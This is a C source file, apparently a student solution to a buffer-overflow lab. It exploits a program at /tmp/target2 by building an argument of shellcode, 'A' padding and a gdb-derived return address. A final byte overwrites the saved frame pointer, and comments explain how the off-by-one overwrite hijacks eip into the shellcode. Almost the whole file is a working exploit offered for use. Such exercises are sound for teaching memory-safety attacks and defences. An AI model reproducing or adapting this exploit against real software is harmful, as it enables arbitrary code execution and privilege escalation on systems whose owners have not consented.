#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char address[4] = { 0x6c, 0xfc, 0xff, 0xbf };

  args[0] = TARGET;

  args[1] = (char *) malloc(241);

  int i;
  int scl = strlen(shellcode);

  // Inject shell code
  for (i = 0; i < scl; i++)
    args[1][i] = shellcode[i];

  // Pad with many A
  for (i = scl; i < 236; i++)
    args[1][i] = 'A';

  // Add the return address found with gdb
  for (i = 0; i < 4; i++)
    args[1][236 + i] = address[i];

  // Add the last byte used to overflow ebp address, found with gdb
  args[1][240] = 0x54;

  // How it works:
  // We set the last byte of saved_ebp so that the new saved_ebp
  // now matches the location where we write the buffer address (minus 4 bytes ; the location of args[1][232])
  // Later in the code when the second function ends, ebp is poped and restored to the wrong "saved_ebp"
  // Even later, when the first function ends, the leave instruction moves ebp into esp (esp is at args[1][232]),
  // then pops ebp (which moves esp to args[1][236]), then pops eip.
  // eip should now be equal to our "address" variable, which is the beggining of our buffer : the shell code.


  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
